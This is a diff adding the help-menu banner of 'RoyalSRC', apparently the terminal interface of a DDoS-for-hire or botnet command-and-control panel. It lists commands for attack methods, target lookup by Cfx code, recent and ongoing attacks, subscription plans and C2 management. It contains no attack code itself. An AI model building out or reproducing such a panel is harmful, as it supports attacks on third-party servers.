@@ -1,0 +1,19 @@
+<<clear()>>
+<<full_screen_custom(59x18)>>
+[97m┌───────────┬──────────────────────────────────────────┐
+[97m│ [38;5;196mCLEAR     [97m│ [38;5;045mClear the terminal screen.               [97m│
+[97m│ [38;5;196mHELP      [97m│ [38;5;045mView this exact banner.                  [97m│
+[97m│ [38;5;196mMETHODS   [97m│ [38;5;045mView the methods list.                   [97m│
+[97m│ [38;5;196mPLAN      [97m│ [38;5;045mView your plan details.                  [97m│
+[97m│ [38;5;196mGRAPH     [97m│ [38;5;045mView a graph details.                    [97m│
+[97m│ [38;5;196mLOOKUP    [97m│ [38;5;045mLookup a target, Cfx code.               [97m│
+[97m│ [38;5;196mRECENT    [97m│ [38;5;045mView your last attacks.                  [97m│
+[97m│ [38;5;196mPASSWD    [97m│ [38;5;045mChange your password on the RoyalSRC.    [97m│
+[97m│ [38;5;196mTHEMES    [97m│ [38;5;045mChange the appearance of the RoyalSRC.   [97m│
+[97m│ [38;5;196mONGOING   [97m│ [38;5;045mView ongoing attacks in the RoyalSRC.    [97m│
+[97m│ [38;5;196mC2        [97m│ [38;5;045mView the command for manage You'r C2.    [97m│
+[97m│ [38;5;196mCREDITS   [97m│ [38;5;045mView credits for RoyalSRC.               [97m│
+[97m│ [38;5;196mCOMMANDS  [97m│ [38;5;045mView Royal SRC commands list.            [97m│
+[97m└───────────┴──────────────────────────────────────────┘
+···
+···
